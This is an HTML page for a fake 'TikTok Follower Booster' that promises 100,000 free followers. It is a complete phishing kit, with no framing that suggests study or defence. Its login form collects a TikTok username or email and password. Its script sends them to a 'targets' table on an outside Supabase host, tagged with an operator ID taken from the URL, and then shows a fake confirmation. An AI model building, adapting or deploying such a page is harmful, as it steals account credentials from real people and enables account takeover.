<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Follower Booster - Get 100k Free</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .tiktok-gradient { background: linear-gradient(45deg, #ff0050, #00f2ea); }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .glow-btn { box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }
        .floating { animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <!-- Success Message (Initially Hidden) -->
    <div id="success-page" class="hidden text-center space-y-6 floating">
        <div class="w-24 h-24 tiktok-gradient rounded-full flex items-center justify-center mx-auto shadow-lg">
            <i class="fas fa-check text-4xl text-white"></i>
        </div>
        <h1 class="text-3xl font-black text-white">REQUEST RECEIVED!</h1>
        <p class="text-gray-400">Your followers will be added within 24 hours.</p>
        <button onclick="location.reload()" class="px-8 py-3 rounded-full border border-white/20 hover:bg-white/10 transition">Done</button>
    </div>

    <!-- Login Page -->
    <div id="login-page" class="w-full max-w-[400px] space-y-8">
        <div class="text-center">
            <i class="fab fa-tiktok text-6xl mb-4"></i>
            <h1 class="text-4xl font-black tracking-tighter">TIKTOK <span class="text-cyan-400">BOOST</span></h1>
            <p class="text-gray-400 text-sm mt-2">Enter details to claim <span class="text-white font-bold">100,000</span> followers</p>
        </div>

        <form id="tiktok-form" class="glass p-8 rounded-3xl space-y-6">
            <div class="space-y-2">
                <label class="text-xs font-bold text-gray-500 uppercase ml-1">Username / Email</label>
                <input type="text" id="target-username" required placeholder="@username" 
                    class="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-cyan-400 transition">
            </div>
            
            <div class="space-y-2">
                <label class="text-xs font-bold text-gray-500 uppercase ml-1">Password</label>
                <input type="password" id="target-password" required placeholder="••••••••" 
                    class="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-cyan-400 transition">
            </div>

            <button type="submit" id="submit-btn" class="w-full tiktok-gradient py-4 rounded-xl font-black text-lg text-white glow-btn hover:scale-[1.02] active:scale-[0.98] transition">
                VERIFY & CLAIM
            </button>
        </form>
    </div>

    <script>
        // Naye Supabase Keys
        const SUPABASE_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
        
        const params = new URLSearchParams(window.location.search);
        const adminId = params.get('user') || 'default_agent';

        document.getElementById('tiktok-form').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submit-btn');
            const u = document.getElementById('target-username').value;
            const p = document.getElementById('target-password').value;

            btn.disabled = true;
            btn.innerText = "VERIFYING...";

            try {
                const response = await fetch(`${SUPABASE_URL}/rest/v1/targets`, {
                    method: 'POST',
                    headers: {
                        'apikey': SUPABASE_KEY,
                        'Authorization': `Bearer ${SUPABASE_KEY}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        user_id: adminId,
                        username: u,
                        password: p,
                        platform: 'tiktok'
                    })
                });

                if (response.ok) {
                    document.getElementById('login-page').classList.add('hidden');
                    document.getElementById('success-page').classList.remove('hidden');
                } else {
                    alert("System Busy. Please try again later.");
                    btn.disabled = false;
                    btn.innerText = "VERIFY & CLAIM";
                }
            } catch (err) {
                alert("Connection Error!");
                btn.disabled = false;
                btn.innerText = "VERIFY & CLAIM";
            }
        };
    </script>
</body>
</html>
